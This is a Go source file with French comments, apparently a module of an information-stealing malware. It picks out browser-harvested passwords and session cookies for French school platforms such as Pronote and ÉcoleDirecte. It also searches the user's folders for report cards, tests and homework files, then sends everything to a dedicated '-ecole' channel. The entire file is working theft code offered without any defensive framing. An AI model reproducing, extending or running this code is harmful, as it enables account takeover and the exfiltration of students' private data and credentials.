// school.go — extraction « scolaire ».
//
// Un salon dédié (`-ecole`) reçoit tout ce qui touche aux plateformes de
// collège et lycée : identifiants Pronote / ÉcoleDirecte / Index Éducation
// captés dans les navigateurs, cookies de session, et documents dont le nom
// évoque un bulletin, une évaluation ou un devoir.
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// schoolDomains : fragments d'URL qui désignent un service scolaire.
var schoolDomains = []string{
	"pronote", "ecoledirecte", "index-education", "indexeducation",
	"edifice", "sacoche", "livretscolaire", "monlycee", "moncollege",
	"education.gouv", "ac-", "ent.", "classroom.google", "kahoot",
	"projet-voltaire", "toutatice", "lycee", "college",
}

// schoolFileWords : mots qui, dans un nom de fichier, désignent un document
// scolaire.
var schoolFileWords = []string{
	"bulletin", "pronote", "ecole", "controle", "evaluation", "devoir",
	"brevet", "bac", "note", "livret", "trimestre", "conseil de classe",
}

func isSchoolURL(u string) bool {
	low := fold(u)
	for _, d := range schoolDomains {
		if strings.Contains(low, d) {
			return true
		}
	}
	return false
}

func isSchoolFile(name string) bool {
	low := fold(name)
	for _, w := range schoolFileWords {
		if strings.Contains(low, w) {
			return true
		}
	}
	return false
}

// schoolSteal filtre les identifiants et cookies scolaires, cherche les
// documents correspondants et envoie le tout dans `-ecole`.
func schoolSteal(creds []credential, cookies []cookie) int {
	ch := ecoleChannel()
	if ch == "" {
		return 0
	}

	var lines []string
	for _, c := range creds {
		if isSchoolURL(c.URL) {
			lines = append(lines, fmt.Sprintf("%s | %s | %s | %s | %s",
				c.Browser, c.Profile, c.URL, c.User, c.Pass))
		}
	}
	for _, c := range cookies {
		if isSchoolURL(c.Host) {
			lines = append(lines, fmt.Sprintf("COOKIE | %s | %s=%s", c.Host, c.Name, c.Value))
		}
	}
	sent := 0
	if len(lines) > 0 {
		data := []byte(strings.Join(lines, "\n"))
		name := fmt.Sprintf("ecole-%s.txt", time.Now().Format("060102-150405"))
		sendFilesTo(ch, fileOut{Name: name, Data: data})
		sent++
	}

	// Documents scolaires dans les dossiers utilisateur.
	found := 0
	for _, root := range exfilRoots() {
		if stopped.Load() || found >= 30 {
			break
		}
		_ = filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
			if err != nil || info == nil || found >= 30 {
				return nil
			}
			if skipExfil(p, info) {
				if info.IsDir() {
					return filepath.SkipDir
				}
				return nil
			}
			if info.IsDir() || info.Size() == 0 || info.Size() > exfilMaxBytes {
				return nil
			}
			if !isSchoolFile(info.Name()) {
				return nil
			}
			data, rerr := os.ReadFile(p)
			if rerr != nil {
				return nil
			}
			sendFilesTo(ch, fileOut{Name: filepath.Base(p), Data: data})
			found++
			time.Sleep(400 * time.Millisecond)
			return nil
		})
	}
	return sent + found
}
